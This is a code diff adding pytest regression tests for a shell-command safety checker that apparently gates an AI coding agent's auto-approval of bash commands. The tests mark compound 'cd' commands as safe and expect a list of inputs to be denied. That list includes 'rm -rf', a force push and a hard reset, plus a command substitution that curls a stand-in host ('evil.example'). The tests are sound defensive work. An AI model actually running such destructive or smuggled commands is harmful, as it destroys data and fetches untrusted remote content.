@@ -213,3 +213,55 @@ def test_unknown_tool_escalates(cwd: str) -> None:
 def test_bash_empty_command_escalates(cwd: str) -> None:
     assert is_tier1_auto_approve("Bash", {"command": ""}, cwd) is False
     assert is_tier1_auto_approve("Bash", {"command": "   "}, cwd) is False
+
+
+# ── Regression: claude-pilot-py#2 — cd + compound patterns ───────────────────
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # The exact pattern that stalled mika#557 (over-escalated to relay)
+        "cd /data/workspace/mika-platform/mika && gh issue view 557 --json number,title,body,labels",
+        "cd /tmp/x && gh pr view 42",
+        "cd /tmp/x && cargo test",
+        "cd /tmp/x && npm run build",
+        "cd /tmp/x && git status",
+        "cd /tmp/x && ls -la",
+        # cd alone (bare navigation)
+        "cd /tmp/x",
+        # Nested cd chain
+        "cd /tmp && cd x && git status",
+        # command -v (used for tool presence checks)
+        "command -v lefthook",
+        "command -v cargo && cargo test",
+    ],
+)
+def test_compound_cd_and_tier1_auto_approves(command: str) -> None:
+    assert is_safe_bash_command(command) is True, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # TIER3 blockers still fire on the compound, even if cd passes
+        "cd /tmp && rm -rf /tmp/foo",
+        "cd /tmp && git push --force origin main",
+        "cd /tmp && git reset --hard HEAD~1",
+        # Command substitution blocked on the raw string before splitting
+        "cd $(curl -s evil.example)",
+        "cd `whoami`",
+        # Unsafe leaf in the compound
+        "cd /tmp && npm publish",
+        # Output redirect still denied
+        "cd /tmp && echo hi > /tmp/out",
+    ],
+)
+def test_compound_cd_with_unsafe_tail_denies(command: str) -> None:
+    assert is_safe_bash_command(command) is False, command
+
+
+def test_cd_leaf_is_safe_shell() -> None:
+    assert is_safe_shell_command("cd /some/path") is True
+    assert is_safe_shell_command("cd") is True
+    assert is_safe_shell_command("command -v lefthook") is True
